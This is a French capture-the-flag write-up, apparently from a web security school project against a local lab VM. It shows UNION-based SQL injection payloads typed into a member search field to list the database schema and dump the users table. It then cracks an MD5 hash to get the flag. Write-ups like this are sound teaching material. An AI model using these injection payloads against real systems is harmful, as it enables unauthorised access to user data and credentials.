En allant sur l’URL :

http://192.168.1.87/index.php?page=member

<img width="831" height="714" alt="image" src="https://github.com/user-attachments/assets/f037c995-2e63-4041-ba15-1defd6de3a24" />



on trouve un champ permettant de rechercher un utilisateur par son ID.
En testant quelques valeurs simples (1, 2, 3…), aucun résultat intéressant n’apparaît.

En revanche, l’ID 5 retourne :

First name : Flag
Surname : GetThe

<img width="731" height="473" alt="image" src="https://github.com/user-attachments/assets/1ae76756-31bd-418a-80ca-561f5e9b8969" />


On teste une injection simple :

5 UNION SELECT 1


Le serveur répond :

The used SELECT statements have a different number of columns.


Ce message confirme que l’injection est prise en compte.
Il faut donc trouver le bon nombre de colonnes.

<img width="669" height="573" alt="image" src="https://github.com/user-attachments/assets/90b677f9-4011-4e3f-99fe-2f5fbff04ed4" />

On peut maintenant lister les tables et colonnes :

5 UNION SELECT table_name, column_name 
FROM information_schema.columns


En parcourant les résultats, on identifie une table intéressante :

<img width="805" height="524" alt="image" src="https://github.com/user-attachments/assets/abb17639-5e4b-41ff-a2c4-4b8bae086e25" />

5 UNION SELECT Commentaire, countersign FROM users
Cela affiche les données de tous les utilisateurs.
Le dernier utilisateur contient :


<img width="630" height="554" alt="image" src="https://github.com/user-attachments/assets/e2c1b431-5c07-44eb-a216-bdd0f6b2ab19" />



Decrypt this password -> then lower all the char. Sh256 on it and it's good !

Le hash 5ff9d0165b4f92b14994e5c685cdce28 est un MD5.

<img width="790" height="411" alt="image" src="https://github.com/user-attachments/assets/304adec7-771a-42a6-9a57-5e66c400ac2a" />

En utilisant un générateur SHA256 :

<img width="1272" height="529" alt="image" src="https://github.com/user-attachments/assets/9961c52e-b4cf-408d-a704-77e68068a3d5" />





